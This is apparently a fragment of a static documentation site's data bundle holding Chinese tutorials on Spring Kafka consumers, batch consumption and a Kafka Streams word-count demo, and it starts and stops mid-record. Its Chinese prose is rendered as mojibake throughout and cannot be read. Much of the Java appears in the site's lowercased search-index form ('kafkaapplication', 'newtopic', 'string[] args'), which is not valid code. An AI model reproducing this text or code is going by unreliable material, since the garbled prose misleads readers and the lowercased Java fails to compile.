brokeråï¼å¨brokerä¸­å¯è½ä¼è¢«é»å¡çï¼å½topicä¸­recordsçæ»sizeå°äºfetch.min.bytesæ¶ï¼ï¼æ­¤æ¶è¿ä¸ªfetchè¯·æ±èæ¶å°±ä¼æ¯è¾é¿ãè¿ä¸ªéç½®å°±æ¯æ¥éç½®consumeræå¤ç­å¾responseå¤ä¹ãæ¯«ç§æ°\n      fetch-max-wait: 1000\n    # æ¶è´¹ç«¯çå¬çtopicä¸å­å¨æ¶ï¼é¡¹ç®å¯å¨ä¼æ¥é(å³æ)\n    listener:\n      # æ¶è´¹èå¹¶åå¯å¨ä¸ªæ°ï¼å¯¹åºååºä¸ªæ°ï¼æ¯ä¸ªlisteneræ¹æ³\n      concurrency: 4\n      # manual listenerè´è´£ackï¼ä½æ¯èåä¹æ¯æ¹éä¸å»\n      # manual_immediate listnerè´è´£ackï¼æ¯è°ç¨ä¸æ¬¡ï¼å°±ç«å³commit\n      # count_time acktimeæackcountåªä¸ªæ¡ä»¶åæ»¡è¶³ï¼å°±commit\n      # count ç´¯ç§¯è¾¾å°ackcountæ¬¡çackå»commit\n      # record æ¯å¤çä¸æ¡commitä¸æ¬¡\n      # batch æ¯æ¬¡pollçæ¶åæ¹éæäº¤ä¸æ¬¡ï¼é¢çåå³äºæ¯æ¬¡pollçè°ç¨é¢ç\n      # time æ¯æ¬¡é´éacktimeçæ¶é´å»commit\n      # ack-mode: manual\n      missing-topics-fatal: false\n      poll-timeout: 3000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n\n\n> groupid ä¸è¬ä¸ºé¡¹ç®åç§°æå¥½ï¼æ¶è´¹è id ä¸è¬ä¸ºä¸å¡æåè½åç§°ï¼topic çè®¾è®¡æå¥½æ¯ é¡¹ç®_ä¸å¡_åè½_æ è¯ id\n\n\n# çäº§ä¸æ¶è´¹\n\nimport org.apache.kafka.clients.admin.newtopic;\nimport org.apache.kafka.clients.consumer.consumerrecord;\nimport org.apache.kafka.clients.producer.producerrecord;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.commandlinerunner;\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.kafka.annotation.kafkalistener;\nimport org.springframework.kafka.annotation.kafkalisteners;\nimport org.springframework.kafka.config.concurrentkafkalistenercontainerfactory;\nimport org.springframework.kafka.config.kafkalistenercontainerfactory;\nimport org.springframework.kafka.config.topicbuilder;\nimport org.springframework.kafka.core.defaultkafkaconsumerfactory;\nimport org.springframework.kafka.core.kafkatemplate;\nimport org.springframework.kafka.support.acknowledgment;\n\nimport javax.annotation.resource;\nimport java.util.list;\n\n@springbootapplication\npublic class kafkaapplication implements commandlinerunner {\n\n\t@resource\n\tkafkatemplate<string, string> kafkatemplate;\n\n\tpublic static void main(string[] args) {\n\t\tspringapplication.run(kafkaapplication.class, args);\n\t}\n\n\t@override\n\tpublic void run(string... args){\n\t\tproducerrecord<string, string> producerrecord = new producerrecord<>("topic1", "11111");\n\t\tkafkatemplate.send(producerrecord);\n\t}\n\n\t/**\n\t * åå»º topic\n\t * @author big uncle\n\t * @date 2021/2/20 10:49\n\t * @param\n\t * @return org.apache.kafka.clients.admin.newtopic\n\t **/\n\t@bean\n\tpublic newtopic topic() {\n\t\treturn topicbuilder.name("topic1")\n\t\t\t\t.partitions(4)\n\t\t\t\t.replicas(1)\n\t\t\t\t.build();\n\t}\n\n\t/**\n\t * æ¶è´¹ æå¨ack éè¦ä¿®æ¹  enable-auto-commit: false\n\t**/\n\t@kafkalistener(id = "myid1", topics = "topic1",groupid="wx_public_number")\n\tpublic void listen1(string in, acknowledgment ack) {\n\t\tsystem.out.println("aaåæ¶è´¹:"+in);\n\t\tack.acknowledge();\n\t}\n\t/**\n\t * æ¶è´¹èªå¨ack éè¦ enable-auto-commit: true\n\t**/\n\t@kafkalistener(id = "myid2", topics = "topic1",groupid="wx_public_number")\n\tpublic void listen2(string in) {\n\t\tsystem.out.println("bbåæ¶è´¹:"+in);\n\t}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n> topic çæ¶æ¯ä¼è¢«åéå°ä¸åçæ¶è´¹ç»ï¼ä¸åçæ¶è´¹ç»åå»ºä¸ä¸ªæ¶è´¹èä¼å®ç°å¹¿æ­æ¶è´¹æ¨¡å¼ï¼åæ­çè¯åªéè¦å æå¤ä½çç»å°±å¥½ã\n\n\n# æ¹éæ¶è´¹\n\npackage com.giant.kafka.config;\n\nimport org.apache.kafka.clients.consumer.consumerconfig;\nimport org.springframework.boot.autoconfigure.kafka.kafkaproperties;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.kafka.config.concurrentkafkalistenercontainerfactory;\nimport org.springframework.kafka.config.kafkalistenercontainerfactory;\nimport org.springframework.kafka.core.defaultkafkaconsumerfactory;\nimport org.springframework.kafka.listener.containerproperties;\n\nimport javax.annotation.resource;\nimport java.util.hashmap;\nimport java.util.map;\nimport java.util.function.consumer;\n\n/**\n * kafka æ¹ééç½®\n * @author big uncle\n * @date 2021/7/7 10:01\n**/\n@configuration\npublic class kafkabatchconf {\n\n    @resource\n    kafkaproperties properties;\n\n\n    /**\n     *  æ¶è´¹èæ¹éå·¥ç¨\n     *  æå¨æäº¤\n     */\n    @bean\n    public kafkalistenercontainerfactory<?> batchfactoryack() {\n        return batchfactorytemplate(factory -> {\n            map<string, object> props = consumeprops();\n            // æå¨æäº¤\n            props.put(consumerconfig.enable_auto_commit_config, boolean.false);\n            factory.setconsumerfactory(new defaultkafkaconsumerfactory<>(props));\n            factory.getcontainerproperties().setackmode(containerproperties.ackmode.manual_immediate);\n        });\n    }\n\n    /**\n     *  æ¶è´¹èæ¹éå·¥ç¨\n     *  èªå¨æäº¤\n     */\n    @bean\n    public kafkalistenercontainerfactory<?> batchfactory() {\n        map<string, object> props = consumeprops();\n        // æä½æåæåæ°æ®çå¤§å°\n        props.put(consumerconfig.fetch_min_bytes_config,  properties.getconsumer().getproperties().get(consumerconfig.fetch_min_bytes_config));\n        // ä¸å¤æä½æåç­å¾ä¸å®çæ¶é´åå»æå\n        props.put(consumerconfig.fetch_max_wait_ms_config,   properties.getconsumer().getproperties().get(consumerconfig.fetch_max_wait_ms_config));\n        return batchfactorytemplate(factory -> factory.setconsumerfactory(new defaultkafkaconsumerfactory<>(props)));\n    }\n\n    /**\n     *  æ¶è´¹èéç½®ä¿¡æ¯\n     */\n    private map<string,object> consumeprops() {\n        map<string, object> props = new hashmap<>(20);\n        // kafka server å°å\n        props.put(consumerconfig.bootstrap_servers_config, properties.getbootstrapservers());\n        // ç»id\n        props.put(consumerconfig.group_id_config, properties.getconsumer().getgroupid());\n        // åç§»é\n        props.put(consumerconfig.auto_offset_reset_config, properties.getconsumer().getautooffsetreset());\n        // æå¤§æåæ¡æ°ï¼è¯¥åæ°è¢«fetch.max.wait.msãfetch.min.bytesãmax.partition.fetch.bytes æå½±å\n        props.put(consumerconfig.max_poll_records_config, properties.getconsumer().getmaxpollrecords());\n        // ä¼è¯è¶æ¶æ¶é´\n        props.put(consumerconfig.session_timeout_ms_config, properties.getconsumer().getproperties().get(consumerconfig.session_timeout_ms_config));\n        // è¯·æ±è¶æ¶æ¶é´\n        props.put(consumerconfig.request_timeout_ms_config, properties.getconsumer().getproperties().get(consumerconfig.request_timeout_ms_config));\n        // keyåºåå\n        props.put(consumerconfig.key_deserializer_class_config, properties.getconsumer().getkeydeserializer());\n        // å¼åºåå\n        props.put(consumerconfig.value_deserializer_class_config, properties.getconsumer().getvaluedeserializer());\n        // èªå¨æäº¤\n        props.put(consumerconfig.enable_auto_commit_config, boolean.true);\n        // èªå¨æäº¤æ¶é´é´é\n        duration autocommitinterval = properties.getconsumer().getautocommitinterval();\n        if(!objectutil.isempty(autocommitinterval)){\n            props.put(consumerconfig.auto_commit_interval_ms_config, long.valueof(autocommitinterval.tomillis()).intvalue());\n        }\n        // poll é´éæ¶é´\n        props.put(consumerconfig.max_poll_interval_ms_config,  properties.getconsumer().getproperties().get(consumerconfig.max_poll_interval_ms_config));\n        return props;\n    }\n\n\n    /**\n     * æ¹éæ¶è´¹æ¨¡æ¿\n    **/\n    private concurrentkafkalistenercontainerfactory batchfactorytemplate(consumer<concurrentkafkalistenercontainerfactory> consumer){\n        concurrentkafkalistenercontainerfactory<integer, string> factory = new concurrentkafkalistenercontainerfactory<>();\n        consumer.accept(factory);\n        factory.setbatchlistener(boolean.true);\n        // å¹¶åçº¿ç¨æ°\n        factory.setconcurrency(properties.getlistener().getconcurrency());\n        return factory;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n\n\nimport org.apache.kafka.clients.admin.newtopic;\nimport org.apache.kafka.clients.consumer.consumerrecord;\nimport org.apache.kafka.clients.producer.producerrecord;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.commandlinerunner;\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.kafka.annotation.kafkalistener;\nimport org.springframework.kafka.annotation.kafkalisteners;\nimport org.springframework.kafka.config.concurrentkafkalistenercontainerfactory;\nimport org.springframework.kafka.config.kafkalistenercontainerfactory;\nimport org.springframework.kafka.config.topicbuilder;\nimport org.springframework.kafka.core.defaultkafkaconsumerfactory;\nimport org.springframework.kafka.core.kafkatemplate;\nimport org.springframework.kafka.support.acknowledgment;\n\nimport javax.annotation.resource;\nimport java.util.list;\n\n@springbootapplication\npublic class kafkaapplication implements commandlinerunner {\n\n\t@resource\n\tkafkatemplate<string, string> kafkatemplate;\n\n\tpublic static void main(string[] args) {\n\t\tspringapplication.run(kafkaapplication.class, args);\n\t}\n\n\t@override\n\tpublic void run(string... args){\n\t\tproducerrecord<string, string> producerrecord = new producerrecord<>("topic1", "11111");\n\t\tkafkatemplate.send(producerrecord);\n\t}\n\n\t/**\n\t * åå»º topic\n\t * @author big uncle\n\t * @date 2021/2/20 10:49\n\t * @param\n\t * @return org.apache.kafka.clients.admin.newtopic\n\t **/\n\t@bean\n\tpublic newtopic topic() {\n\t\treturn topicbuilder.name("topic1")\n\t\t\t\t.partitions(4)\n\t\t\t\t.replicas(1)\n\t\t\t\t.build();\n\t}\n\n    /**\n     * æ¹éèªå¨ç¡®è®¤ack\n    **/\n    @kafkalistener(id = "consumer_1", topics = "topic1",groupid="wx_public_number",containerfactory = "batchfactory")\n    public void consumer_1(list<string> in) {\n        log.debug("æ¶è´¹æ°æ® {}",in.size());\n    }\n\n    /**\n     * æ¹éæå¨ç¡®è®¤ack\n    **/\n    @kafkalistener(id = "consumer_2", topics = "topic1",groupid="wx_public_number",containerfactory = "batchfactoryack")\n    public void consumer_2(list<string> in,acknowledgment ack) {\n        log.debug("æ¶è´¹æ°æ® {}",in.size());\n        ack.acknowledge();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\næ¹éæ¶è´¹ååæ¡æ¶è´¹ä¸å½±åç¸äºä½¿ç¨ã\n\næä¸åååºæ¶è´¹\n\n@kafkalistener(id = "consumer_2", topicpartitions = { @topicpartition(topic = "topic1", partitions = { "1" }) },groupid="wx_public_number")\npublic void consumer_2(string str) {\n    log.debug("æ¶è´¹æ°æ® {}",str);\n}\n\n\n1\n2\n3\n4\n\n\n> key å partition çåºå«\n> å¦æä¸ä¸ªææç partition å±æ§æ°å¼è¢«æå®ï¼é£ä¹å¨åéè®°å½æ¶ partition å±æ§æ°å¼å°±ä¼è¢«åºç¨ãå¦ææ²¡æ partition å±æ§æ°å¼è¢«æå®ï¼èä¸ä¸ª key å±æ§è¢«å£°æçè¯ï¼ä¸ä¸ª partition ä¼éè¿ key ç hash èè¢«éä¸­ãå¦ææ¢æ²¡æ key ä¹æ²¡æ partition å±æ§æ°å¼è¢«å£°æï¼é£ä¹ä¸ä¸ª partition å°ä¼è¢«åéä»¥è½®è¯¢çæ¹å¼ã',charsets:{cjk:!0}},{title:"kafka-2.7.0 Kafka Streams æµå¤ç",frontmatter:{title:"kafka-2.7.0 Kafka Streams æµå¤ç",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1404",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1404.kafka-2.7.0%20Kafka%20Streams%20%E6%B5%81%E5%A4%84%E7%90%86.html",relativePath:"02.ä¸­é´ä»¶/01.kafka/1404.kafka-2.7.0 Kafka Streams æµå¤ç.md",key:"v-72fa657c",path:"/kafka/1404/",headers:[{level:2,title:"ç®è¿°",slug:"ç®è¿°",normalizedTitle:"ç®è¿°",charIndex:2},{level:2,title:"å¥é¨",slug:"å¥é¨",normalizedTitle:"å¥é¨",charIndex:79},{level:2,title:"èªå®ä¹ stream",slug:"èªå®ä¹-stream",normalizedTitle:"èªå®ä¹ stream",charIndex:1925}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ç®è¿° å¥é¨ èªå®ä¹ stream",content:'# ç®è¿°\n\nç®åæ¥è¯´ï¼Kafka Streams å°±æ¯å¯ä»¥å¨ kafka åé¨å®ç°ä¸å¥é¶å»¶æ¶ãå¯å®å¶çæ°æ®è®¡ç®å¤çé»è¾ï¼å¯ä»¥æä¸è¿ç»­çæ°æ®è¿è¡è®¡ç®ã\n\n\n# å¥é¨\n\nå¯å¨ zookeeper å kafka\n\nbin/zookeeper-server-start.sh config/zookeeper.properties & bin/kafka-server-start.sh -daemon config/server.properties \n\n\n1\n\n\nåå»º topic\n\nbin/kafka-topics.sh --create --zookeeper 192.168.81.62:2181 --replication-factor 1 --partitions 1 --topic streams-plaintext-input \nbin/kafka-topics.sh --create --zookeeper 192.168.81.62:2181 --replication-factor 1 --partitions 1 --topic streams-plaintext-output\n\n\n1\n2\n\n\næ¥ç topic ç¶æ\n\nbin/kafka-topics.sh --zookeeper 192.168.81.62:2181 --describe \n\n\n1\n\n\nåå¤å¥½äºè¿äºä¹åæä»¬å°±å¯ä»¥è¿è¡ Kafka Streams ç Word Count ç¨åºäºã Kafka èªå¸¦äº Demo ç¨åºä¾ç¨æ·ä½¿ç¨\n\nbin/kafka-run-class.sh org.apache.kafka.streams.examples.wordcount.WordCountDemo \n\n\n1\n\n\nä¸é¢ç WordCountDemo ä¼åºå®å°è¯»ååä¸º streams-plaintext-input topic ï¼ä¸ºè¯»åçæ¯æ¡æ¶æ¯æ§è¡ Word Count ç¨åºçè½¬æ¢è®¡ç®é»è¾ï¼ç¶åæç»­å°æå¤çç»æåºå®åå¥ streams-wordcount-output ä¸­ ãå½è¿è¡ä¸è¿°å½ä»¤æ¶ï¼ä¼çä¸å°ä»»ä½è¾åºãéè¦å¯å¨ kafka-console-consumer æè½çå°æç»æ¶æ¯ãä½æä»¬åå¯å¨ Kafka èªå¸¦ç console producer æ¥çäº§ä¸äºè¾å¥æ°æ®ä¾ Word Count ç¨åºæ¶è´¹ã\n\nbin/kafka-console-producer.sh --broker-list 192.168.81.62:9092 --topic streams-plaintext-input\n\n\n1\n\n\nå¯å¨åææ¶ä¸è¦åéä»»ä½æ°æ®ï¼æ¥ä¸æ¥æ°å»ºçªå£å¯å¨ kafka-console-consumer\n\nbin/kafka-console-consumer.sh --bootstrap-server 192.168.81.62:9092 \\\n--topic streams-wordcount-output \\\n--from-beginning \\\n--formatter kafka.tools.DefaultMessageFormatter \\\n--property print.key=true \\\n--property print.value=true \\\n--property key.deserializer=org.apache.kafka.common.serialization.StringDeserializer \\\n--property value.deserializer=org.apache.kafka.common.serialization.LongDeserializer\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¦æä»¥ä¸å½ä»¤åºç° WARN è­¦åä¿¡æ¯ï¼åæ¯æ­£å¸¸çï¼è¿æ¯å ä¸ºå½ clients é¦æ¬¡å broker åéè¯·æ±è·åè¯¥ topic æ°æ®æ¶ï¼å¾å¯è½å°æªæè¯¥ topic çåæ°æ®ä¿¡æ¯ï¼æ broker å clients è¿åçååºä¸­ä¼å¸¦ä¸ LEADER_NOT_AVAILABLE å¼å¸¸ï¼è¡¨æ clients åºè¯¥ä¸»å¨æ´æ°åæ°æ®ã\n\næ¥ä¸æ¥åéæ°æ®ï¼èå¨ kafka-console-consumer çªå£å°±è½çå°æ°æ®ç»è®¡ã\n\n> å¦æè®¾ç½®ç kafka éç½®ä¸æ¯ localhost:9092 æè 127.0.01:9092ï¼åè¿è¡ä¸äºï¼å ä¸ºä»ç demo é»è®¤ bootstrap.server å°±æ¯ localhost:9092ï¼ä¹æ²¡å°æ¹ä¿®æ¹éç½®ï¼é¤éä¿®æ¹æºç ï¼é£å°±ç­äºèªå®ä¹ä¸æ ·ã\n\n\n# èªå®ä¹ stream\n\nå¨ä¸é¢çä¾å­ï¼å ä¸ºææ¬èº« kafka éç½®çåå å¯¼è´ææ æ³ä½¿ç¨ streamï¼æä»¥æä»£ç æ¹äºæ¹ï¼è®© bootstrap.server æåæçéç½®ã\n\n<dependency>\n    <groupId>org.apache.kafka</groupId>\n    <artifactId>kafka-streams</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\npackage com.example.demo.stream;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.common.serialization.Serdes;\nimport org.apache.kafka.streams.KafkaStreams;\nimport org.apache.kafka.streams.KeyValue;\nimport org.apache.kafka.streams.StreamsBuilder;\nimport org.apache.kafka.streams.StreamsConfig;\nimport org.apache.kafka.streams.kstream.*;\nimport org.apache.kafka.streams.kstream.internals.KStreamImpl;\n\nimport java.util.Arrays;\nimport java.util.Locale;\nimport java.util.Properties;\nimport java.util.concurrent.CountDownLatch;\n\n/**\n * @author big uncle\n * @date 2021/3/2 13:29\n * @module\n **/\npublic class TJStream {\n\n\n    public static void main(String[] args) {\n\n        Properties properties = new Properties();\n        properties.put(StreamsConfig.APPLICATION_ID_CONFIG,"streams-wordcount");\n        properties.put(StreamsConfig.BOOTSTRAP_SERVERS_CONFIG,"192.168.81.62:9092") ;\n        properties.put(StreamsConfig.DEFAULT_KEY_SERDE_CLASS_CONFIG, Serdes.String().getClass().getName());\n        properties.put(StreamsConfig.DEFAULT_VALUE_SERDE_CLASS_CONFIG, Serdes.String().getClass().getName());\n        //ä½¿å¾æ¯æ¬¡è¿è¡ç¨åºæ¶é½è½ä¿è¯ä»å¤´æ¶è´¹ä¸æ¬¡æ¶æ¯ã\n        properties.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG,"earliest");\n\n        StreamsBuilder builder= new StreamsBuilder();\n        // æå®è¾å¥ topic\n        KStream<String, String> source = builder.stream("streams-plaintext-input");\n        KTable<String,Long> counts = source.flatMapValues(new ValueMapper<String, Iterable<String>>() {\n            @Override\n            public Iterable<String> apply(String s) {\n                return Arrays.asList(s.toLowerCase(Locale.getDefault()).split(" "));\n            }\n        }).groupBy(new KeyValueMapper<String, String, String>() {\n            @Override\n            public String apply(String s, String s2) {\n                return s2;\n            }\n        }).count();\n        counts\n            // è½¬æ¢ KStream ç±»å\n            .toStream()\n            // æ value ç long ç±»åè½¬æ¢ä½ string ç±»å\n            .map((k,v) -> new KeyValue<String,String>(k,String.valueOf(v)))\n            // åéå°è¿ä¸ª topic\n            .to("streams-wordcount-output",Produced.with(Serdes.String(),Serdes.String()));\n\n        final KafkaStreams streams = new KafkaStreams (builder.build(), properties) ;\n        // æ·»å çæ§ï¼å³é­ä¹åéæ¾èµæº\n        final CountDownLatch latch = new CountDownLatch (1) ;\n        Runtime.getRuntime().addShutdownHook (new Thread ("streams-wordcount-shutdown-hook") {\n            @Override\n            public void run() {\n                streams.close();\n                latch.countDown();\n            }\n        });\n        try {\n            // è¿è¡ è¿éä¸ä¼é»å¡\n            streams.start();\n            // é»å¡ä¸»çº¿ç¨\n            latch.await();\n        }catch(Throwable e) {\n            System.exit(1);\n        }\n        System.exit(0);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\n> kafka stream éé¢ç Api è¿æ¯æå¿è¦å­¦ä¹ ä¸ä¸ç\n\nææ jar åï¼ç¶åæ jar æ¾å¥ /kafka/libs ä¸ï¼å¯å¨\n\nbin/kafka-run-class.sh com.example.demo.stream.TJStream\n\n\n1\n\n\nå¯å¨ä¹åä¼æå¾å¤è­¦åï¼ä¸éè¦ç®¡ï¼æç§å¦ä¸çæ­¥éª¤æä»¬ç»§ç»­æä½å°±è¡ï¼å°æ­¤å°±è½çå°è¾å¥çæ°æ®ãä»¥ä¸æ¯æè¾åºçç»è®¡ä¿¡æ¯ï¼ä½æ¯ consumer å¨æ¶è´¹çæ¶åæ¯è¾æ¢ï¼ä¸æ¯å³æ¶çã\n\nhaha    4\nhah     1\nha      5\n\n\n1\n2\n3\n\n\n> æä»¬ä¹å¯ä»¥ä½¿ç¨ spring boot æ¥çå¬ streams-wordcount-output è¿ä¸ª topic æ¥æ¥æ¶æ°æ®',normalizedContent:'# ç®è¿°\n\nç®åæ¥è¯´ï¼kafka streams å°±æ¯å¯ä»¥å¨ kafka åé¨å®ç°ä¸å¥é¶å»¶æ¶ãå¯å®å¶çæ°æ®è®¡ç®å¤çé»è¾ï¼å¯ä»¥æä¸è¿ç»­çæ°æ®è¿è¡è®¡ç®ã\n\n\n# å¥é¨\n\nå¯å¨ zookeeper å kafka\n\nbin/zookeeper-server-start.sh config/zookeeper.properties & bin/kafka-server-start.sh -daemon config/server.properties \n\n\n1\n\n\nåå»º topic\n\nbin/kafka-topics.sh --create --zookeeper 192.168.81.62:2181 --replication-factor 1 --partitions 1 --topic streams-plaintext-input \nbin/kafka-topics.sh --create --zookeeper 192.168.81.62:2181 --replication-factor 1 --partitions 1 --topic streams-plaintext-output\n\n\n1\n2\n\n\næ¥ç topic ç¶æ\n\nbin/kafka-topics.sh --zookeeper 192.168.81.62:2181 --describe \n\n\n1\n\n\nåå¤å¥½äºè¿äºä¹åæä»¬å°±å¯ä»¥è¿è¡ kafka streams ç word count ç¨åºäºã kafka èªå¸¦äº demo ç¨åºä¾ç¨æ·ä½¿ç¨\n\nbin/kafka-run-class.sh org.apache.kafka.streams.examples.wordcount.wordcountdemo \n\n\n1\n\n\nä¸é¢ç wordcountdemo ä¼åºå®å°è¯»ååä¸º streams-plaintext-input topic ï¼ä¸ºè¯»åçæ¯æ¡æ¶æ¯æ§è¡ word count ç¨åºçè½¬æ¢è®¡ç®é»è¾ï¼ç¶åæç»­å°æå¤çç»æåºå®åå¥ streams-wordcount-output ä¸­ ãå½è¿è¡ä¸è¿°å½ä»¤æ¶ï¼ä¼çä¸å°ä»»ä½è¾åºãéè¦å¯å¨ kafka-console-consumer æè½çå°æç»æ¶æ¯ãä½æä»¬åå¯å¨ kafka èªå¸¦ç console producer æ¥çäº§ä¸äºè¾å¥æ°æ®ä¾ word count ç¨åºæ¶è´¹ã\n\nbin/kafka-console-producer.sh --broker-list 192.168.81.62:9092 --topic streams-plaintext-input\n\n\n1\n\n\nå¯å¨åææ¶ä¸è¦åéä»»ä½æ°æ®ï¼æ¥ä¸æ¥æ°å»ºçªå£å¯å¨ kafka-console-consumer\n\nbin/kafka-console-consumer.sh --bootstrap-server 192.168.81.62:9092 \\\n--topic streams-wordcount-output \\\n--from-beginning \\\n--formatter kafka.tools.defaultmessageformatter \\\n--property print.key=true \\\n--property print.value=true \\\n--property key.deserializer=org.apache.kafka.common.serialization.stringdeserializer \\\n--property value.deserializer=org.apache.kafka.common.serialization.longdeserializer\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¦æä»¥ä¸å½ä»¤åºç° warn è­¦åä¿¡æ¯ï¼åæ¯æ­£å¸¸çï¼è¿æ¯å ä¸ºå½ clients é¦æ¬¡å broker åéè¯·æ±è·åè¯¥ topic æ°æ®æ¶ï¼å¾å¯è½å°æªæè¯¥ topic çåæ°æ®ä¿¡æ¯ï¼æ broker å clients è¿åçååºä¸­ä¼å¸¦ä¸ leader_not_available å¼å¸¸ï¼è¡¨æ clients åºè¯¥ä¸»å¨æ´æ°åæ°æ®ã\n\næ¥ä¸æ¥åéæ°æ®ï¼èå¨ kafka-console-consumer çªå£å°±è½çå°æ°æ®ç»è®¡ã\n\n> å¦æè®¾ç½®ç kafka éç½®ä¸æ¯ localhost:9092 æè 127.0.01:9092ï¼åè¿è¡ä¸äºï¼å ä¸ºä»ç demo é»è®¤ bootstrap.server å°±æ¯ localhost:9092ï¼ä¹æ²¡å°æ¹ä¿®æ¹éç½®ï¼é¤éä¿®æ¹æºç ï¼é£å°±ç­äºèªå®ä¹ä¸æ ·ã\n\n\n# èªå®ä¹ stream\n\nå¨ä¸é¢çä¾å­ï¼å ä¸ºææ¬èº« kafka éç½®çåå å¯¼è´ææ æ³ä½¿ç¨ streamï¼æä»¥æä»£ç æ¹äºæ¹ï¼è®© bootstrap.server æåæçéç½®ã\n\n<dependency>\n    <groupid>org.apache.kafka</groupid>\n    <artifactid>kafka-streams</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\npackage com.example.demo.stream;\nimport org.apache.kafka.clients.consumer.consumerconfig;\nimport org.apache.kafka.common.serialization.serdes;\nimport org.apache.kafka.streams.kafkastreams;\nimport org.apache.kafka.streams.keyvalue;\nimport org.apache.kafka.streams.streamsbuilder;\nimport org.apache.kafka.streams.streamsconfig;\nimport org.apache.kafka.streams.kstream.*;\nimport org.apache.kafka.streams.kstream.internals.kstreamimpl;\n\nimport java.util.arrays;\nimport java.util.locale;\nimport java.util.properties;\nimport java.util.concurrent.countdownlatch;\n\n/**\n * @author big uncle\n * @date 2021/3/2 13:29\n * @module\n **/\npublic class tjstream {\n\n\n    public static void main(string[] args) {\n\n        properties properties = new properties();\n        properties.put(streamsconfig.application_id_config,"streams-wordcount");\n        properties.put(streamsconfig.bootstrap_servers_config,"192.168.81.62:9092") ;\n        properties.put(streamsconfig.default_key_serde_class_config, serdes.string().getclass().getname());\n        properties.put(streamsconfig.default_value_serde_class_config, serdes.string().getclass().getname());\n        //ä½¿å¾æ¯æ¬¡è¿è¡ç¨åºæ¶é½è½ä¿è¯ä»å¤´æ¶è´¹ä¸æ¬¡æ¶æ¯ã\n        properties.put(consumerconfig.auto_offset_reset_config,"earliest");\n\n        streamsbuilder builder= new streamsbuilder();\n        // æå®è¾å¥ topic\n        kstream<string, string> source = builder.stream("streams-plaintext-input");\n        ktable<string,long> counts = source.flatmapvalues(new valuemapper<string, iterable<string>>() {\n            @override\n            public iterable<string> apply(string s) {\n                return arrays.aslist(s.tolowercase(locale.getdefault()).split(" "));\n            }\n        }).groupby(new keyvaluemapper<string, string, string>() {\n            @override\n            public string apply(string s, string s2) {\n                return s2;\n            }\n        }).count();\n        counts\n            // è½¬æ¢ kstream ç±»å\n            .tostream()\n            // æ value ç long ç±»åè½¬æ¢ä½ string ç±»å\n            .map((k,v) -> new keyvalue<string,string>(k,string.valueof(v)))\n            // åéå°è¿ä¸ª topic\n            .to("streams-wordcount-output",produced.with(serdes.string(),serdes.string()));\n\n        final kafkastreams streams = new kafkastreams (builder.build(), properties) ;\n        // æ·»å çæ§ï¼å³é­ä¹åéæ¾èµæº\n        final countdownlatch latch = new countdownlatch (1) ;\n        runtime.getruntime().addshutdownhook (new thread ("streams-wordcount-shutdown-hook") {\n            @override\n            public void run() {\n                streams.close();\n                latch.countdown();\n            }\n        });\n        try {\n            // è¿è¡ è¿éä¸ä¼é»å¡\n            